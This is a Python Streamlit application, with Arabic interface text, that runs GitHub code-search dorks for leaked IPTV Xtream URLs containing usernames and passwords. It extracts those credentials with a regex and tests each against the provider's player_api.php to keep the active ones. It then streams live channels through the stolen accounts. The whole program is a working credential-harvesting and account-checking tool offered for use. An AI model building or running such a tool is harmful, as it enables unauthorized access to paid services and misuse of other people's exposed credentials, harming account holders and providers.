import streamlit as st
import requests
import re
import time
import threading
from datetime import datetime

# إعدادات الواجهة والصفحة
st.set_page_config(page_title="BEAST V24 - XTREAM PLAYER", layout="wide")

# تهيئة متغيرات الجلسة (Session State)
if "auth" not in st.session_state: st.session_state.auth = False
if "hits" not in st.session_state: st.session_state.hits = []
if "is_scanning" not in st.session_state: st.session_state.is_scanning = False
if "page" not in st.session_state: st.session_state.page = "search"
if "selected_server" not in st.session_state: st.session_state.selected_server = None

# نظام الدخول
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V24 - ULTIMATE FEED</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الألوان الاحترافي
st.markdown("""
<style>
    .stApp { background-color: #050505; color: white; }
    .active-hit { 
        background: #111; border: 1px solid #00ff41; 
        padding: 15px; border-radius: 10px; margin-bottom: 10px;
    }
    .channel-card {
        background: #1a1a1a; padding: 10px; border-radius: 5px; 
        margin: 5px; cursor: pointer; border: 1px solid #333;
    }
    .channel-card:hover { border-color: #00ff41; }
    .text-green { color: #00ff41; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

# --- محرك البحث في الخلفية ---
def scanner_worker(token):
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    dorks = ['extension:txt "get.php?username=" "password="', 'extension:m3u "player_api.php"']
    
    while st.session_state.is_scanning:
        for dork in dorks:
            for page in range(1, 10): # فحص أول 10 صفحات لكل دروك
                if not st.session_state.is_scanning: break
                try:
                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
                    res = requests.get(url, headers=headers).json()
                    if "items" in res:
                        for item in res['items']:
                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw_url, timeout=3).text
                            matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                            
                            for m in matches:
                                host, user, pw = m[0], m[1], m[2]
                                # تجنب التكرار
                                if not any(h['host'] == host and h['user'] == user for h in st.session_state.hits):
                                    try:
                                        check = requests.get(f"{host}/player_api.php?username={user}&password={pw}", timeout=2).json()
                                        if check.get("user_info", {}).get("status") == "Active":
                                            st.session_state.hits.append({"host": host, "user": user, "pw": pw, "info": check["user_info"]})
                                    except: continue
                except: continue
                time.sleep(2) # تأخير لتجنب الحظر
        time.sleep(60) # راحة دقيقة ثم إعادة البحث

# --- الواجهة البرمجية ---

# صفحة البحث
if st.session_state.page == "search":
    st.title("📡 رادار البحث المباشر")
    
    with st.sidebar:
        token = st.text_input("GitHub Token:", type="password")
        if not st.session_state.is_scanning:
            if st.button("🚀 ابدأ البحث المستمر"):
                st.session_state.is_scanning = True
                threading.Thread(target=scanner_worker, args=(token,), daemon=True).start()
                st.rerun()
        else:
            if st.button("🛑 إيقاف البحث"):
                st.session_state.is_scanning = False
                st.rerun()
        
        st.write(f"📊 عدد السيرفرات المكتشفة: {len(st.session_state.hits)}")

    if not st.session_state.hits:
        st.info("جاري انتظار النتائج... تأكد من وضع التوكن وضغط ابدأ.")
    
    for idx, srv in enumerate(st.session_state.hits):
        with st.container():
            col1, col2 = st.columns([4, 1])
            with col1:
                st.markdown(f"""
                <div class="active-hit">
                    <span class="text-green">✅ سيرفر نشط</span> | {srv['host']}<br>
                    <small>User: {srv['user']} | Exp: {datetime.fromtimestamp(int(srv['info'].get('exp_date', 0))).strftime('%Y-%m-%d') if srv['info'].get('exp_date') else 'N/A'}</small>
                </div>
                """, unsafe_allow_html=True)
            with col2:
                if st.button("📺 تشغيل الآن", key=f"play_{idx}"):
                    st.session_state.selected_server = srv
                    st.session_state.page = "player"
                    st.rerun()

# صفحة مشغل إكستريم (Xtream Player)
elif st.session_state.page == "player":
    srv = st.session_state.selected_server
    st.title(f"🎬 مشغل إكستريم: {srv['host']}")
    
    if st.button("⬅️ العودة للبحث"):
        st.session_state.page = "search"
        st.rerun()

    # جلب القنوات
    @st.cache_data(ttl=600)
    def get_xtream_data(h, u, p, action):
        try:
            url = f"{h}/player_api.php?username={u}&password={p}&action={action}"
            return requests.get(url, timeout=5).json()
        except: return []

    col_cats, col_chans, col_player = st.columns([1, 1.5, 2])

    with col_cats:
        st.subheader("📁 الفئات")
        categories = get_xtream_data(srv['host'], srv['user'], srv['pw'], "get_live_categories")
        cat_names = {c['category_id']: c['category_name'] for c in categories}
        selected_cat = st.selectbox("اختر الفئة", options=list(cat_names.keys()), format_func=lambda x: cat_names[x])

    with col_chans:
        st.subheader("📺 القنوات")
        all_channels = get_xtream_data(srv['host'], srv['user'], srv['pw'], "get_live_streams")
        filtered_channels = [ch for ch in all_channels if ch.get('category_id') == selected_cat]
        
        if not filtered_channels:
            st.write("لا توجد قنوات في هذه الفئة.")
        else:
            # عرض القنوات كأزرار اختيار
            for ch in filtered_channels[:50]: # عرض أول 50 قناة فقط لتجنب البطء
                if st.button(f"▶️ {ch['name']}", key=f"ch_{ch['stream_id']}", use_container_width=True):
                    st.session_state.current_stream = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{ch['stream_id']}.ts"

    with col_player:
        st.subheader("🖼️ شاشة العرض")
        if "current_stream" in st.session_state:
            st.video(st.session_state.current_stream)
            st.code(st.session_state.current_stream, language="bash")
        else:
            st.info("اختر قناة من القائمة لبدء البث المباشر.")
